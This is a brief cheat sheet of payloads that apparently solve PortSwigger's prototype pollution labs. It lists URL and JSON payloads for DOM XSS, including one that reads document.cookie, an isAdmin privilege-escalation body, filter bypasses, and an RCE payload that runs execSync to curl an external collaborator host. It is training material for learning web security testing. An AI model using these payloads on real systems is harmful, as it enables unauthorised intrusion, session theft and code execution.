# Prototype pollution




## Approach
It fires very well with the DOM-Invader extension. Arises, usually, in these JS files: searchLogger.js, searchLoggerAlternative.js and similar searchLogger.

### Labs Portswigger
1. DOM XSS via client-side prototype pollution
```
https://site.com/?__proto__[transport_url]=data:,alert(1)
```

2. DOM XSS via an alternative prototype pollution vector
```
https://site.com/?__proto__.sequence=alert(1)-
```

3. Client-side prototype pollution via flawed sanitization
```
https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
```

4. Client-side prototype pollution in third-party libraries
```
<script>
location="https:/site.com/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```

5. Client-side prototype pollution via browser APIs
```
https://site.com/?__proto__[value]=data:,alert(1)
```

6. Privilege escalation via server-side prototype pollution
```
Billing and Delivery Address:
"__proto__": {
    "isAdmin":true
}
```

7. Detecting server-side prototype pollution without polluted property reflection
```
"__proto__": {
 "status":555
}
```

8. Bypassing flawed input filters for server-side prototype pollution
>https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization
```
 "constructor":{
"prototype":{
"isAdmin":true
}}
```

9. Remote code execution via server-side prototype pollution
```
"__proto__":
{"execArgv": [
  "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
]}
```
